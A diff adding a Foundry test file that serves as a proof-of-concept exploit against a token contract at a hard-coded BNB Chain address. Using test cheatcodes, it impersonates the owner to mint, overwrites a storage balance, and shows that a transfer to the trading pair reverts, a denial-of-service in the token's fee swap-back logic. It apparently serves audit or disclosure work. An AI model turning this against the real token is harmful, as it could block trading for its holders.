@@ -1,0 +1,59 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.5;
+
+import "forge-std/Test.sol";
+
+// Minimal interface for the vulnerable token
+interface IStandardToken {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function pair() external view returns (address);
+    function mint(address to, uint256 amount) external;
+    function totalSupply() external view returns (uint256);
+}
+
+// Exploit test harness
+contract ExploitTest is Test {
+    address constant TOKEN = 0xea01d8d9eacca9996db6bb3377c1fe64308e7328;
+    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+
+    IStandardToken token;
+    address pair;
+    address owner;
+
+    function setUp() public {
+        token = IStandardToken(TOKEN);
+        pair = token.pair();
+        // Read owner from storage slot 0 (Ownable.owner)
+        owner = address(uint160(uint256(vm.load(TOKEN, bytes32(0)))));
+        vm.label(TOKEN, "StandardToken");
+        vm.label(pair, "Pair");
+        vm.label(owner, "Owner");
+        vm.label(ROUTER, "PancakeRouter");
+    }
+
+    function testExploit_DoS_on_TransferToPair() public {
+        // 1. Give this contract some tokens to sell
+        vm.startPrank(owner);
+        token.mint(address(this), 1000e18);
+        vm.stopPrank();
+
+        // 2. Manually set the contract's own token balance above the swapback threshold
+        //    _SWAPBACK_THRESHOLD is [1,10000] => threshold = totalSupply / 10000 ≈ 12,500 tokens
+        //    We set it to 1e24 (far above)
+        bytes32 balanceMapSlot = bytes32(uint256(7)); // balanceOf mapping slot in StandardToken
+        bytes32 contractBalanceSlot = keccak256(abi.encode(TOKEN, balanceMapSlot));
+        vm.store(TOKEN, contractBalanceSlot, bytes32(uint256(1e24)));
+
+        // 3. Attempt to sell tokens to the pair – this will trigger _sellAndDistributeAccumulatedTKNFee
+        //    The liquidity fee is zero (default), so TKNtoLiquidity = 0.
+        //    After the swap, _gotBNB > 0, but addLiquidityETH(0 tokens) will revert.
+        vm.expectRevert();
+        token.transfer(pair, 100e18);
+
+        // If the test passes, the revert confirms the denial-of-service condition.
+    }
+}
+```
